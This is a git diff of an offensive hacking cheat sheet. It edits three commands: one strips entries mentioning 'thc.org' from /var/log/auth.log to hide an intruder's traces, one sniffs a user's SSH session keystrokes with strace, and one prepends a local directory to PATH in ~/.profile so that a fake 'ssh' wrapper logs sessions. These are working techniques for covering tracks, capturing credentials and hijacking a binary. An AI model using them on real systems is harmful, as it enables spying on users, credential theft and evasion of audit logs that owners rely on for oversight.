@@ -391,6 +391,7 @@ This will reset the logfile to 0 without having to restart syslogd etc:
 
 This will remove any sign of us from the log file:
 ```
+# cd /dev/shm
 # grep -v 'thc\.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
 ```
 
@@ -446,8 +447,7 @@ Store data in `/mnt/crypted`, then unmount:
 <a id="sss-anchor"></a>
 **8.i. Sniff a user's SSH session**
 ```
-$ strace -p <PID of ssh> -e trace=read -o ~/.ssh/ssh_log.txt
-$ grep 'read(4' ~/.ssh/ssh_log.txt | cut -f1 -d\"
+$ strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
 ```
 Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
 
@@ -458,11 +458,10 @@ Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strac
 
 Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
 ```
-# Add ~/.ssh to the execution PATH variable so our 'ssh' is executed instead of the real ssh:
+# Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
 $ echo '$PATH=~/.local/bin:$PATH' >>~/.profile
 
-# Create our log directory and our own ssh binary
-$ mkdir ~/.ssh/.logs
+# Create a log directory and our own ssh binary
 $ mkdir -p ~/.local/bin ~/.ssh/logs
 
 $ cat >~/.local/bin/ssh
